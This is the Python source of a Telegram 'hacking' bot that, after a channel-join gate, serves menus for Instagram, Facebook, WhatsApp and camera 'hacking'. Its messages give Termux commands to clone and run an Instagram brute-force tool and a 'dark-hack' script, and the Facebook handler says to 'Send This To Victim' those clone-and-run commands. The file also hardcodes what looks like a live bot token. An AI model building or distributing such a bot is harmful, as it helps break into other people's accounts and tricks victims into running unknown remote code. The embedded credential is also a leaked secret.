import logging
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, ContextTypes, CallbackQueryHandler, CommandHandler
import pytz

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)

logger = logging.getLogger(__name__)

BOT_TOKEN = '7818915591:AAF1G5KKcZm51N6iuf99IlzIRDFoVsCr2iI'

def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [
        [InlineKeyboardButton("Join Channel", url="https://t.me/DUDUU_MENDEZ_HACKING_BOT")],
        [InlineKeyboardButton("I've Joined", callback_data="joined")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text("Welcome to DUDUU_MENDEZ_HACKING_BOT! Please join our channel to start using the bot.", reply_markup=reply_markup)

def joined(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [
        [InlineKeyboardButton("Camera and IP Hacking", callback_data="camera_hacking")],
        [InlineKeyboardButton("Free Instagram likes", callback_data="free_instagram_likes")],
        [InlineKeyboardButton("Instagram HACKING", callback_data="instagram_hacking")],
        [InlineKeyboardButton("FACEBOOK HACKING", callback_data="facebook_hacking")],
        [InlineKeyboardButton("WHATSAPP HACKING", callback_data="whatsapp_hacking")],
        [InlineKeyboardButton("MENDEZ WEBSITE", callback_data="mendez_website")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.callback_query.edit_message_text("Select an option:", reply_markup=reply_markup)

def camera_hacking(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    update.callback_query.edit_message_text("Click here to start bot of Camera hacking @Prankstdbot")

def free_instagram_likes(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    update.callback_query.edit_message_text("Get free 100 likes everyday for free click here to Start @InstagramLikeRoBot")

def instagram_hacking(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    update.callback_query.edit_message_text(
        "✅NEW INSTAGRAM BRUTE FORCE TOOL\n"
        "🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸\n\n"
        "Insta-Breaker is a tool designed for automated login attempts on Instagram using a username and a file containing multiple passwords. It is intended for ethical use only, such as testing the security of your own Instagram account.\n\n"
        "💵INSTALLATION\n\n"
        "$ pkg update\n"
        "$ pkg install python -y\n"
        "$ git clone https://github.com/GH05T-HUNTER5/insta-breaker\n"
        "$ cd insta-breaker\n"
        "$ bash install.sh\n"
        "$ insta-breaker\n\n"
        "The test password should be tested by adding your password on line one, two, three, or four.\n\n"
        "Password.txt\n\n"
        "18273939\n"
        "Iwieieie\n"
        "Iejdhdhd\n"
        "Your--pass\n"
        "Jajsndndn\n\n"
        "100% Working\n\n"
        "If this repository gets 5k likes, we will add more features such as:\n\n"
        "Enhanced protection mechanisms\n"
        "Automatic IP address addition"
    )

def facebook_hacking(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    update.callback_query.edit_message_text(
        "Copy and paste these commands on termux, Send This To Victim\n\n"
        "`pkg update`\n"
        "`pkg upgrade`\n"
        "`pkg install git`\n"
        "`pkg openssh`\n"
        "`git clone https://github.com/Codot-ID/dark-hack`\n"
        "`cd dark-hack`\n"
        "`sh dark.sh`\n\n"
        "Enjoy hacking various platforms."
    )

def whatsapp_hacking(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    update.callback_query.edit_message_text(
        "Copy and paste these commands on termux:\n"
        "`pkg update`\n"
        "`pkg upgrade`\n"
        "`pkg install git`\n"
        "`pkg openssh`\n"
        "`git clone https://github.com/Codot-ID/dark-hack`\n"
        "`cd dark-hack`\n"
        "`sh dark.sh`\n\n"
        "Enjoy hacking various platforms."
    )

def mendez_website(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    update.callback_query.edit_message_text("Enjoy more info about hacking from Mendez website 👉 https://mendez-website.vercel.app/")

def main() -> None:
    # Create the application
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(joined, pattern="joined"))
    application.add_handler(CallbackQueryHandler(camera_hacking, pattern="camera_hacking"))
    application.add_handler(CallbackQueryHandler(free_instagram_likes, pattern="free_instagram_likes"))
    application.add_handler(CallbackQueryHandler(instagram_hacking, pattern="instagram_hacking"))
    application.add_handler(CallbackQueryHandler(facebook_hacking, pattern="facebook_hacking"))
    application.add_handler(CallbackQueryHandler(whatsapp_hacking, pattern="whatsapp_hacking"))
    application.add_handler(CallbackQueryHandler(mendez_website, pattern="mendez_website"))

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()